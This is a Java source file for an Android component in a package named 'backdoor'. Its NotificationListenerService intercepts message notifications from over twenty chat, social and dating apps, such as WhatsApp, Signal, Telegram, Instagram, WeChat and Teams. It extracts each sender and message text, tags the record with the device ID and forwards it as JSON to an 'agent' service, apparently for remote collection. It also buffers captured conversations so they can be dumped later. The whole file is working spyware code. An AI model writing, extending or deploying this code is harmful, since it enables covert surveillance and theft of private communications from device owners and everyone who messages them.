package com.lazyframework.backdoor;

import android.annotation.SuppressLint;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.os.Bundle;
import android.util.Log;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ConcurrentHashMap;

public class NotificationListener extends NotificationListenerService {
    private static final String TAG = "LazyFramework";

    // ==================== PACKAGE NAMES ====================
    // WhatsApp
    private static final String WHATSAPP_PACKAGE = "com.whatsapp";
    private static final String WHATSAPP_BUSINESS_PACKAGE = "com.whatsapp.w4b";
    private static final String TELEGRAM_PACKAGE = "org.telegram.messenger";
    private static final String SIGNAL_PACKAGE = "org.thoughtcrime.securesms";

    // Instagram
    private static final String INSTAGRAM_PACKAGE = "com.instagram.android";

    // Twitter / X
    private static final String TWITTER_PACKAGE = "com.twitter.android";
    private static final String X_PACKAGE = "com.x.android";

    // ✅ TIKTOK
    private static final String TIKTOK_PACKAGE = "com.tiktok.android";

    // Messenger (Facebook)
    private static final String FACEBOOK_MESSENGER = "com.facebook.lite";

    // Lemo
    private static final String LEMO_PACKAGE = "com.lemo.chat";

    // Litmatch
    private static final String LITMATCH_PACKAGE = "com.litmatch.chat";

    // Michat
    private static final String MICHAT_PACKAGE = "com.michat.android";

    // Apps lain
    private static final String FACEBOOK_PACKAGE = "com.facebook.katana";
    private static final String LINE_PACKAGE = "jp.naver.line.android";
    private static final String DISCORD_PACKAGE = "com.discord";
    private static final String SNAPCHAT_PACKAGE = "com.snapchat.android";

    // ✅ APPS BARU
    private static final String WECHAT_PACKAGE = "com.tencent.mm";
    private static final String KAKAO_PACKAGE = "com.kakao.talk";
    private static final String VIBER_PACKAGE = "com.viber.voip";
    private static final String HANGOUTS_PACKAGE = "com.google.android.talk";
    private static final String GROUP_ME_PACKAGE = "com.groupme.android";
    private static final String SLACK_PACKAGE = "com.Slack";
    private static final String TEAMS_PACKAGE = "com.microsoft.teams";

    // Cache untuk menghindari duplikasi
    private static final ConcurrentHashMap<String, Long> processedMessages = new ConcurrentHashMap<>();
    private static final long CACHE_TTL = 5000;

    private static AgentService agentService;
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private final StringBuilder messageBuffer = new StringBuilder();
    private static final int MAX_BUFFER_SIZE = 50000;

    public interface MessageListener {
        void onMessageCaptured(String appName, String sender, String message, String timestamp);
    }

    private static MessageListener messageListener;

    public static void setAgentService(AgentService service) {
        agentService = service;
    }

    public static void setMessageListener(MessageListener listener) {
        messageListener = listener;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🔔 Notification Listener Service created");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();

        if (!isSupportedApp(packageName)) {
            return;
        }

        try {
            Bundle extras = sbn.getNotification().extras;

            String key = sbn.getKey();
            if (isDuplicate(key)) {
                return;
            }

            String title = extras.getString("android.title", "");
            String text = extras.getString("android.text", "");
            String bigText = extras.getString("android.bigText", "");
            CharSequence summary = extras.getCharSequence("android.summaryText");

            String fullText = text;
            if (bigText != null && !bigText.isEmpty() && !bigText.equals(text)) {
                fullText = bigText;
            }

            if ((fullText == null || fullText.isEmpty()) && summary != null) {
                fullText = summary.toString();
            }

            if (fullText == null || fullText.isEmpty()) {
                return;
            }

            String appName = getAppName(packageName);
            String sender = extractSender(title, packageName, fullText);
            String message = cleanMessage(fullText, sender, packageName);
            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    .format(new Date());

            Log.d(TAG, "📥 Message captured:");
            Log.d(TAG, "   App: " + appName);
            Log.d(TAG, "   Package: " + packageName);
            Log.d(TAG, "   From: " + sender);
            Log.d(TAG, "   Message: " + message.substring(0, Math.min(100, message.length())) + "...");

            if (agentService != null) {
                // Kirim ke WhatsApp (existing)
                agentService.onWhatsAppMessageCaptured(appName, sender, message, timestamp);

                // Kirim social message
                sendAppSpecificMessage(packageName, appName, sender, message, timestamp);
            }

            if (messageListener != null) {
                messageListener.onMessageCaptured(appName, sender, message, timestamp);
            }

            appendToBuffer(appName, sender, message, timestamp);

            mainHandler.postDelayed(() -> {
                processedMessages.remove(key);
            }, CACHE_TTL);

        } catch (Exception e) {
            Log.e(TAG, "❌ Error processing notification: " + e.getMessage());
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Tidak digunakan
    }

    // ==================== SUPPORTED APPS ====================

    private boolean isSupportedApp(String packageName) {
        return WHATSAPP_PACKAGE.equals(packageName) ||
                WHATSAPP_BUSINESS_PACKAGE.equals(packageName) ||
                TELEGRAM_PACKAGE.equals(packageName) ||
                SIGNAL_PACKAGE.equals(packageName) ||
                INSTAGRAM_PACKAGE.equals(packageName) ||
                TWITTER_PACKAGE.equals(packageName) ||
                X_PACKAGE.equals(packageName) ||
                FACEBOOK_PACKAGE.equals(packageName) ||
                FACEBOOK_MESSENGER.equals(packageName) ||
                LINE_PACKAGE.equals(packageName) ||
                DISCORD_PACKAGE.equals(packageName) ||
                SNAPCHAT_PACKAGE.equals(packageName) ||
                // ✅ TIKTOK
                TIKTOK_PACKAGE.equals(packageName) ||
                LEMO_PACKAGE.equals(packageName) ||
                LITMATCH_PACKAGE.equals(packageName) ||
                MICHAT_PACKAGE.equals(packageName) ||
                // ✅ APPS BARU
                WECHAT_PACKAGE.equals(packageName) ||
                KAKAO_PACKAGE.equals(packageName) ||
                VIBER_PACKAGE.equals(packageName) ||
                HANGOUTS_PACKAGE.equals(packageName) ||
                GROUP_ME_PACKAGE.equals(packageName) ||
                SLACK_PACKAGE.equals(packageName) ||
                TEAMS_PACKAGE.equals(packageName);
    }

    // ==================== APP NAME ====================

    private String getAppName(String packageName) {
        switch (packageName) {
            case WHATSAPP_PACKAGE:
            case WHATSAPP_BUSINESS_PACKAGE:
                return "WhatsApp";
            case TELEGRAM_PACKAGE:
                return "Telegram";
            case SIGNAL_PACKAGE:
                return "Signal";
            case INSTAGRAM_PACKAGE:
                return "Instagram";
            case TWITTER_PACKAGE:
            case X_PACKAGE:
                return "Twitter/X";
            case FACEBOOK_PACKAGE:
                return "Facebook";
            case FACEBOOK_MESSENGER:
                return "Messenger";
            case LINE_PACKAGE:
                return "LINE";
            case DISCORD_PACKAGE:
                return "Discord";
            case SNAPCHAT_PACKAGE:
                return "Snapchat";
            // ✅ TIKTOK
            case TIKTOK_PACKAGE:
                return "TikTok";
            case LEMO_PACKAGE:
                return "Lemo";
            case LITMATCH_PACKAGE:
                return "Litmatch";
            case MICHAT_PACKAGE:
                return "Michat";
            // ✅ APPS BARU
            case WECHAT_PACKAGE:
                return "WeChat";
            case KAKAO_PACKAGE:
                return "KakaoTalk";
            case VIBER_PACKAGE:
                return "Viber";
            case HANGOUTS_PACKAGE:
                return "Hangouts";
            case GROUP_ME_PACKAGE:
                return "GroupMe";
            case SLACK_PACKAGE:
                return "Slack";
            case TEAMS_PACKAGE:
                return "Teams";
            default:
                return packageName;
        }
    }

    // ==================== EXTRACT SENDER ====================

    private String extractSender(String title, String packageName, String fullText) {
        switch (packageName) {
            case WHATSAPP_PACKAGE:
            case WHATSAPP_BUSINESS_PACKAGE:
                if (title.contains(":")) {
                    return title.substring(0, title.indexOf(":")).trim();
                }
                if (title.contains(" - ")) {
                    return title.substring(0, title.indexOf(" - ")).trim();
                }
                return title.trim();

            case INSTAGRAM_PACKAGE:
                if (title.contains("sent a message")) {
                    return title.replace("sent a message", "").trim();
                }
                if (title.contains(":")) {
                    return title.substring(0, title.indexOf(":")).trim();
                }
                if (title.contains(" - ")) {
                    return title.substring(0, title.indexOf(" - ")).trim();
                }
                if (fullText != null && fullText.contains(":")) {
                    return fullText.substring(0, fullText.indexOf(":")).trim();
                }
                return title.trim();

            case TWITTER_PACKAGE:
            case X_PACKAGE:
                if (title.contains("sent a message")) {
                    return title.replace("sent a message", "").trim();
                }
                if (title.contains(":")) {
                    return title.substring(0, title.indexOf(":")).trim();
                }
                if (title.contains(" - ")) {
                    return title.substring(0, title.indexOf(" - ")).trim();
                }
                if (fullText != null && fullText.contains(":")) {
                    return fullText.substring(0, fullText.indexOf(":")).trim();
                }
                String sender = title.trim();
                if (!sender.startsWith("@") && !sender.startsWith(" ")) {
                    sender = "@" + sender;
                }
                return sender;

            case TELEGRAM_PACKAGE:
                if (title.contains(" (")) {
                    return title.substring(0, title.indexOf(" (")).trim();
                }
                return title.trim();

            case SIGNAL_PACKAGE:
            case FACEBOOK_MESSENGER:
            case LINE_PACKAGE:
            case DISCORD_PACKAGE:
                if (title.contains(":")) {
                    return title.substring(0, title.indexOf(":")).trim();
                }
                return title.trim();

            // ✅ TIKTOK
            case TIKTOK_PACKAGE:
                // Format notifikasi TikTok bermacam-macam
    if (title.contains(":")) {
        return title.substring(0, title.indexOf(":")).trim();
    }
    if (title.contains(" sent you a message")) {
        return title.replace(" sent you a message", "").trim();
    }
    if (title.contains(" messaged you")) {
        return title.replace(" messaged you", "").trim();
    }
    if (title.contains("from ")) {
        return title.substring(title.indexOf("from ") + 5).trim();
    }
    if (title.contains(" - ")) {
        return title.substring(0, title.indexOf(" - ")).trim();
    }
    // Fallback: cari di fullText
    if (fullText != null && fullText.contains(":")) {
        return fullText.substring(0, fullText.indexOf(":")).trim();
    }
    if (fullText != null && fullText.contains("from ")) {
        return fullText.substring(fullText.indexOf("from ") + 5).trim();
    }
                return title.trim();

            // ✅ Lemo, Litmatch, Michat
            case LEMO_PACKAGE:
            case LITMATCH_PACKAGE:
            case MICHAT_PACKAGE:
                if (title.contains(":")) {
                    return title.substring(0, title.indexOf(":")).trim();
                }
                if (title.contains(" - ")) {
                    return title.substring(0, title.indexOf(" - ")).trim();
                }
                if (title.contains("sent you a message")) {
                    return title.replace("sent you a message", "").trim();
                }
                if (title.contains("messaged you")) {
                    return title.replace("messaged you", "").trim();
                }
                if (fullText != null && fullText.contains(":")) {
                    return fullText.substring(0, fullText.indexOf(":")).trim();
                }
                return title.trim();

            // ✅ APPS BARU
            case WECHAT_PACKAGE:
                if (title.contains(":")) {
                    return title.substring(0, title.indexOf(":")).trim();
                }
                if (title.contains(" sent you a message")) {
                    return title.replace(" sent you a message", "").trim();
                }
                if (fullText != null && fullText.contains(":")) {
                    return fullText.substring(0, fullText.indexOf(":")).trim();
                }
                return title.trim();

            case KAKAO_PACKAGE:
                if (title.contains(":")) {
                    return title.substring(0, title.indexOf(":")).trim();
                }
                if (title.contains(" from ")) {
                    return title.substring(title.indexOf(" from ") + 5).trim();
                }
                if (fullText != null && fullText.contains(":")) {
                    return fullText.substring(0, fullText.indexOf(":")).trim();
                }
                return title.trim();

            case VIBER_PACKAGE:
            case HANGOUTS_PACKAGE:
            case GROUP_ME_PACKAGE:
            case SLACK_PACKAGE:
            case TEAMS_PACKAGE:
                if (title.contains(":")) {
                    return title.substring(0, title.indexOf(":")).trim();
                }
                if (title.contains(" - ")) {
                    return title.substring(0, title.indexOf(" - ")).trim();
                }
                if (fullText != null && fullText.contains(":")) {
                    return fullText.substring(0, fullText.indexOf(":")).trim();
                }
                return title.trim();

            default:
                return title.trim();
        }
    }

    // ==================== CLEAN MESSAGE ====================

    private String cleanMessage(String message, String sender, String packageName) {
        String cleaned = message;

        if (sender != null && !sender.isEmpty()) {
            String[] patterns = {
                    sender + ": ",
                    sender + ":",
                    sender + " - ",
                    sender + " sent a message: ",
                    sender + " said: ",
                    sender + " messaged you: ",
                    sender + " sent you a message: ",
            };

            for (String pattern : patterns) {
                if (cleaned.startsWith(pattern)) {
                    cleaned = cleaned.substring(pattern.length()).trim();
                    break;
                }
            }
        }

        // Instagram
        if (INSTAGRAM_PACKAGE.equals(packageName)) {
            cleaned = cleaned.replaceAll("sent a (photo|video|reel)", "");
            cleaned = cleaned.replaceAll("liked your .*", "");
            cleaned = cleaned.replaceAll("commented on your .*", "");
        }

        // Twitter
        if (TWITTER_PACKAGE.equals(packageName) || X_PACKAGE.equals(packageName)) {
            cleaned = cleaned.replaceAll("sent a message", "");
            cleaned = cleaned.replaceAll("mentioned you", "");
            cleaned = cleaned.replaceAll("liked your tweet", "");
            cleaned = cleaned.replaceAll("retweeted", "");
        }

        // ✅ TikTok
        if (TIKTOK_PACKAGE.equals(packageName)) {
            cleaned = cleaned.replaceAll("sent you a message", "");
            cleaned = cleaned.replaceAll("sent you a (video|photo|gift)", "");
            cleaned = cleaned.replaceAll("liked your video", "");
            cleaned = cleaned.replaceAll("commented on your video", "");
            cleaned = cleaned.replaceAll("started a live", "");
            cleaned = cleaned.replaceAll("sent you a gift", "");
            cleaned = cleaned.replaceAll("followed you", "");
        }

        // ✅ Lemo / Litmatch / Michat
        if (LEMO_PACKAGE.equals(packageName) ||
                LITMATCH_PACKAGE.equals(packageName) ||
                MICHAT_PACKAGE.equals(packageName)) {
            cleaned = cleaned.replaceAll("sent you a message", "");
            cleaned = cleaned.replaceAll("messaged you", "");
            cleaned = cleaned.replaceAll("liked your profile", "");
            cleaned = cleaned.replaceAll("matched with you", "");
            cleaned = cleaned.replaceAll("super liked you", "");
            cleaned = cleaned.replaceAll("sent you a (photo|video)", "");
        }

        // ✅ WeChat
        if (WECHAT_PACKAGE.equals(packageName)) {
            cleaned = cleaned.replaceAll("sent you a message", "");
            cleaned = cleaned.replaceAll("sent you a (photo|video|voice message)", "");
            cleaned = cleaned.replaceAll("mentioned you", "");
            cleaned = cleaned.replaceAll("liked your post", "");
        }

        // ✅ KakaoTalk
        if (KAKAO_PACKAGE.equals(packageName)) {
            cleaned = cleaned.replaceAll("sent you a message", "");
            cleaned = cleaned.replaceAll("sent you a (photo|video|voice)", "");
            cleaned = cleaned.replaceAll("mentioned you", "");
        }

        // ✅ Viber
        if (VIBER_PACKAGE.equals(packageName)) {
            cleaned = cleaned.replaceAll("sent you a message", "");
            cleaned = cleaned.replaceAll("sent you a (photo|video|sticker)", "");
            cleaned = cleaned.replaceAll("called you", "");
        }

        // ✅ Slack
        if (SLACK_PACKAGE.equals(packageName)) {
            cleaned = cleaned.replaceAll("mentioned you", "");
            cleaned = cleaned.replaceAll("sent a message", "");
            cleaned = cleaned.replaceAll("in #", "");
        }

        // ✅ Teams
        if (TEAMS_PACKAGE.equals(packageName)) {
            cleaned = cleaned.replaceAll("mentioned you", "");
            cleaned = cleaned.replaceAll("sent a message", "");
            cleaned = cleaned.replaceAll("in (General|channel)", "");
        }

        return cleaned.trim();
    }

    // ==================== APP SPECIFIC MESSAGE ====================

    private void sendAppSpecificMessage(String packageName, String appName,
                                        String sender, String message, String timestamp) {
        if (agentService == null) return;

        try {
            JSONObject json = new JSONObject();
            json.put("type", "social_message");
            json.put("agent_id", getAgentId());
            json.put("app_name", appName);
            json.put("package_name", packageName);
            json.put("sender", sender);
            json.put("message", message);
            json.put("timestamp", timestamp);
            json.put("platform", getPlatform(packageName));
            json.put("time_ms", System.currentTimeMillis());

            agentService.sendRawData(json.toString());

            Log.d(TAG, "📤 Social message forwarded: " + appName + " - " + sender);

        } catch (Exception e) {
            Log.e(TAG, "Send social message error: " + e.getMessage());
        }
    }

    private String getPlatform(String packageName) {
        if (INSTAGRAM_PACKAGE.equals(packageName)) return "instagram";
        if (TWITTER_PACKAGE.equals(packageName) || X_PACKAGE.equals(packageName)) return "twitter";
        if (WHATSAPP_PACKAGE.equals(packageName) || WHATSAPP_BUSINESS_PACKAGE.equals(packageName)) return "whatsapp";
        if (TELEGRAM_PACKAGE.equals(packageName)) return "telegram";
        if (SIGNAL_PACKAGE.equals(packageName)) return "signal";
        if (FACEBOOK_MESSENGER.equals(packageName)) return "messenger";
        if (LINE_PACKAGE.equals(packageName)) return "line";
        if (DISCORD_PACKAGE.equals(packageName)) return "discord";
        // ✅ TIKTOK
        if (TIKTOK_PACKAGE.equals(packageName)) return "tiktok";
        if (LEMO_PACKAGE.equals(packageName)) return "lemo";
        if (LITMATCH_PACKAGE.equals(packageName)) return "litmatch";
        if (MICHAT_PACKAGE.equals(packageName)) return "michat";
        // ✅ APPS BARU
        if (WECHAT_PACKAGE.equals(packageName)) return "wechat";
        if (KAKAO_PACKAGE.equals(packageName)) return "kakao";
        if (VIBER_PACKAGE.equals(packageName)) return "viber";
        if (HANGOUTS_PACKAGE.equals(packageName)) return "hangouts";
        if (GROUP_ME_PACKAGE.equals(packageName)) return "groupme";
        if (SLACK_PACKAGE.equals(packageName)) return "slack";
        if (TEAMS_PACKAGE.equals(packageName)) return "teams";
        return "other";
    }

    // ==================== HELPER METHODS ====================

    private boolean isDuplicate(String key) {
        Long lastTime = processedMessages.get(key);
        if (lastTime != null) {
            long now = System.currentTimeMillis();
            if (now - lastTime < CACHE_TTL) {
                return true;
            }
        }
        processedMessages.put(key, System.currentTimeMillis());
        return false;
    }

    private void appendToBuffer(String appName, String sender, String message, String timestamp) {
        synchronized (messageBuffer) {
            String entry = String.format("[%s] %s - %s: %s\n",
                    timestamp, appName, sender, message);
            messageBuffer.append(entry);

            if (messageBuffer.length() > MAX_BUFFER_SIZE) {
                int cutIndex = messageBuffer.indexOf("\n", messageBuffer.length() - MAX_BUFFER_SIZE / 2);
                if (cutIndex > 0) {
                    messageBuffer.delete(0, cutIndex + 1);
                }
            }
        }
    }

    private String getAgentId() {
        try {
            return android.provider.Settings.Secure.getString(
                    getContentResolver(),
                    android.provider.Settings.Secure.ANDROID_ID
            );
        } catch (Exception e) {
            return "unknown";
        }
    }

    public String dumpMessages() {
        synchronized (messageBuffer) {
            String result = messageBuffer.toString();
            messageBuffer.setLength(0);
            return result;
        }
    }

    public void clearMessages() {
        synchronized (messageBuffer) {
            messageBuffer.setLength(0);
        }
    }

    @SuppressLint("DefaultLocale")
    public String getMessageStats() {
        synchronized (messageBuffer) {
            return String.format("Messages captured: %d lines, %d bytes",
                    messageBuffer.toString().split("\n").length,
                    messageBuffer.length());
        }
    }
}
